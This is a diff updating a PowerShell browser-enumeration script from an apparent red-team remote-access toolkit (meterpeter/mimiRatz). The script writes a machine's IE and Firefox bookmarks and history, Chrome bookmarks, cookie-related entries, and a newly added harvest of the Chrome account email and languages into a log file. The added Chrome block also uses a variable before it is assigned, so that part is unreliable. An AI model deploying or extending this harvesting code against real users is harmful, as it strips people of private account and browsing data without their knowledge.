@@ -5,7 +5,7 @@
 .Author r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: Local Web Browser
   Optional Dependencies: None
-  PS Script Dev Version: v1.5
+  PS Script Dev Version: v1.6
 
 .DESCRIPTION
    Standalone Powershell script to dump Local-host browser information sutch as: HomePage, Browser Version
@@ -39,7 +39,6 @@
 .LINK 
     https://github.com/r00t-3xp10it/meterpeter
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1
-    https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1 (flagged by AV)
 #>
 
 $RFP = $null
@@ -95,7 +94,7 @@ function HELP_MENU {
     write-host ".Author r00t-3xp10it {SSA RedTeam @2020}" -ForegroundColor Green
     write-host "  Required Dependencies: Local Web Browser"
     write-host "  Optional Dependencies: None"
-    write-host "  PS Script Dev Version: v1.5"
+    write-host "  PS Script Dev Version: v1.6"
     write-host "`n"
     write-host ".DESCRIPTION" -ForegroundColor Green
     write-host "  Standalone Powershell script to dump Local-host browser information sutch as:"
@@ -171,6 +170,7 @@ function IE_Dump {
   }
 
   ## Retrieve IE Bookmarks
+  # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
   echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
   echo "------------" >> $LogFilePath\BrowserEnum.log
   $URLs = Get-ChildItem -Path "$Env:SYSTEMDRIVE\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
@@ -234,6 +234,7 @@ function FIREFOX {
   }
 
   ## Dump FIREFOX HISTORY URLs
+  # Source: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
   If($Path -eq $False) {
       echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
       echo "---------------" >> $LogFilePath\BrowserEnum.log
@@ -264,10 +265,28 @@ function CHROME {
       echo "--------------" >> $LogFilePath\BrowserEnum.log
       echo "Could not find any Chrome Info .." >> $LogFilePath\BrowserEnum.log
   }else{
-      $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
       echo "`n`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
-      echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log
+      ## Retrieve Browser accept languages
+      $Parse_String = $Store_Path.split(",")
+      $Dump_Lang = $Parse_String|select-string "accept_languages"
+      $Exist_Dump = $Dump_Lang -replace '"','' -replace 'intl:{','' -replace ':',' : '
+      echo "$Exist_Dump" >> $LogFilePath\BrowserEnum.log
+
+        ## Retrieve Browser Version
+        $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
+        echo "Version          : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log
+        ## Retrieve Email from Google CHROME preferencies File ..
+        $Store_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+        $Parse_String = $Store_Path.split(",")
+        $Dump_Email = $Parse_String|select-string "email"
+        $Exist_Dump = $Dump_Email -replace ' ','' -replace '"','' -replace ':','            : '
+
+        If($Exist_Dump){
+            echo "$Exist_Dump" >> $LogFilePath\BrowserEnum.log
+        }else{
+            echo "Email        : None Email Found .." >> $LogFilePath\BrowserEnum.log
+        }
   }
 
   ## Retrieve Chrome bookmarks
@@ -276,7 +295,7 @@ function CHROME {
   If($check_path -eq $True){
       echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
       echo "----------------" >> $LogFilePath\BrowserEnum.log
-      Get-Content $Path|Select-String "http"|format-list >> $LogFilePath\BrowserEnum.log
+      Get-Content $Path|Select-String "http" >> $LogFilePath\BrowserEnum.log # |format-list
   }else{
       echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
       echo "----------------" >> $LogFilePath\BrowserEnum.log
@@ -293,7 +312,7 @@ function CHROME {
       $Parse_String = $Store_Path.split(",");$Find_MyHash = $Parse_String|Select-String "hash"
       $BadChars = $Find_MyHash -replace '"setting":{"hasHighScore":false',''
       $Dump = $BadChars|where-object {$_}
-      echo "$Dump" >> $LogFilePath\BrowserEnum.log
+      echo $Dump >> $LogFilePath\BrowserEnum.log
   }else{
       echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
       echo "--------------" >> $LogFilePath\BrowserEnum.log
